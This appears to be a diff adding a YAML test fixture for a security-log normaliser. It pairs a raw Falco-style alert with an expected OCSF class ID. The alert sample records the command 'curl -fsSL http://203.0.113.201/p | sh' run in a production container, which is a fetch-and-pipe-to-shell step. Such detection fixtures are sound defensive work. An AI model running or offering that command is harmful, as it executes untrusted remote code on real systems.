@@ -1,0 +1,4 @@
+---
+raw_sample: '{"output":"Write below binary dir (user=msmith command=curl http://203.0.113.201/p container_id=9da263103b19)","priority":"Critical","rule":"Write below binary dir","time":"2026-10-15T09:16:46.856Z","output_fields":{"proc.cmdline":"curl -fsSL http://203.0.113.201/p | sh","proc.pname":"runc","user.name":"msmith","user.uid":1000,"container.id":"9da263103b19","container.image.repository":"docker.io/library/nginx","k8s.ns.name":"prod","k8s.pod.name":"workload-2gw6r"},"hostname":"mail-citadel-01","source":"syscall"}'
+expected:
+  class_uid: 1001
